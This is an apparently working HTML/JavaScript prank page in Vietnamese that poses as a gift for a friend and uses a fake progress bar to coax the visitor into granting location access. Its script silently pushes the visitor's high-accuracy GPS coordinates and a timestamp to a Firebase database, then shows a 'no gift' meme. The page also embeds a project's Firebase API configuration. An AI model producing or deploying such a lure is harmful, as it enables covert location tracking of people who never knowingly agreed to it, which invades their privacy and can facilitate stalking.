<!DOCTYPE html>
<html lang="vi">
  <head>
    <meta charset="UTF-8" />
    <title>Có quà cho bạn thân iu</title>
    <link rel="stylesheet" href="check.css" />
    <script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-database-compat.js"></script>
  </head>
  <body>
    <div class="loading-box">
      <img
        src="https://cdn-icons-png.flaticon.com/512/2545/2545643.png"
        alt="Gift"
        class="gift-img"
      />
      <h2>🎀 You cấp quyền đi , có bất ngờ đó 🎀</h2>
      <div class="progress">
        <div class="progress-bar" id="progress-bar"></div>
      </div>
      <p id="status">Đang lấy quà cho youuu , đợi tí nè ...</p>
    </div>

    <script>
      const status = document.getElementById("status");
      const progressBar = document.getElementById("progress-bar");

      const firebaseConfig = {
        apiKey: "AIzaSyCb5oNoQPUQT-r3fiwHf0dEzm6z_B6nWA4",
        authDomain: "cuong-a179d.firebaseapp.com",
        databaseURL:
          "https://cuong-a179d-default-rtdb.asia-southeast1.firebasedatabase.app",
        projectId: "cuong-a179d",
        storageBucket: "cuong-a179d.firebasestorage.app",
        messagingSenderId: "452569201467",
        appId: "1:452569201467:web:516311a3b060d6d9d8551e",
        measurementId: "G-RBPRXXBPCP",
      };

      firebase.initializeApp(firebaseConfig);
      const db = firebase.database();

      function fakeLoading(callback) {
        let width = 0;
        const interval = setInterval(() => {
          if (width >= 100) {
            clearInterval(interval);
            callback();
          } else {
            width += Math.floor(Math.random() * 10) + 5;
            if (width > 100) width = 100;
            progressBar.style.width = width + "%";
          }
        }, 300);
      }

      function getLocationAndSend() {
        if (!navigator.geolocation) {
          status.innerText = "Lỗi rùi đổi trình duyệt khác đuyyy";
          return;
        }
        navigator.geolocation.getCurrentPosition(
          (pos) => {
            const lat = pos.coords.latitude;
            const lon = pos.coords.longitude;
            const now = new Date().toISOString();
            db.ref("locations").push({ lat, lon, time: now });
            status.innerText = "💖 Lêu lêuu , ko có quà đâuuu! 💖";
            progressBar.style.width = "100%";
            setTimeout(() => {
              const overlay = document.createElement("div");
              overlay.className = "overlay";
              document.body.appendChild(overlay);

              const img = document.createElement("img");
              img.src =
                "https://m.yodycdn.com/blog/meme-meo-bua-yody-vn-36.jpg";
              img.className = "final-image";
              document.body.appendChild(img);

              setTimeout(() => {
                overlay.style.background = "rgba(0,0,0,0.7)";
                img.style.opacity = "1";
              }, 100);
            }, 1700);
          },
          (err) => {
            status.innerText = "⛔ Bạn từ chối quà của mình à 😢";
          },
          { enableHighAccuracy: true }
        );
      }

      fakeLoading(getLocationAndSend);
    </script>
  </body>
</html>
